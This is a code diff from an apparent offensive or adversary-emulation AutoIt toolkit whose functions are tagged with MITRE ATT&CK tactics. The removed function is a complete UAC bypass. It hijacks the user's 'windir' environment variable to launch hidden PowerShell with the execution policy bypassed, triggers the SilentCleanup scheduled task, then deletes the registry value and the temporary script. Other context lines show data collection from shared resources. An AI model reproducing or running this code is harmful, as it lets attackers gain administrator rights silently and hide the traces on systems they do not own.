@@ -74,23 +74,6 @@ Func RunElevated($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";');DESCRIPTI
    RunWait($buffer00);
 EndFunc
 
-Func RunElevatedNoUAC($command = "regedit");DESCRIPTION:Run command with elevated permissions WITHOUT UAC;MITRE:Execution
-   $bufferxx='if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {' & $command & ';}'
-   $bufferyy='else {$registryPath = "HKCU:\Environment";$Name = "windir";$Value = "powershell -ep bypass -w h $PSCommandPath;#";'
-   $bufferzz='Set-ItemProperty -Path $registryPath -Name $name -Value $Value;'
-   $buffertt='schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null;Remove-ItemProperty -Path $registryPath -Name $name}'
-   $buffer = $bufferxx & $bufferyy & $bufferzz & $buffertt
-   $sFileName = @ScriptDir &"\buffer.ps1"
-   $hFilehandle = FileOpen($sFileName, $FO_OVERWRITE)
-   FileWrite($hFilehandle, $buffer)
-   FileClose($hFilehandle)
-   $buffer01 = "powershell.exe -noexit ./";
-   $buffer00 = $buffer01 & "buffer.ps1"
-   RunWait($buffer00);
-   Sleep(4 * 1000)
-   FileDelete($sFileName)
-EndFunc
-
 Func SharedDiscover();DESCRIPTION:Returns stream of data from Shared Resources;MITRE:Collection
    Local $limiter = "----------"
    Local $buffer
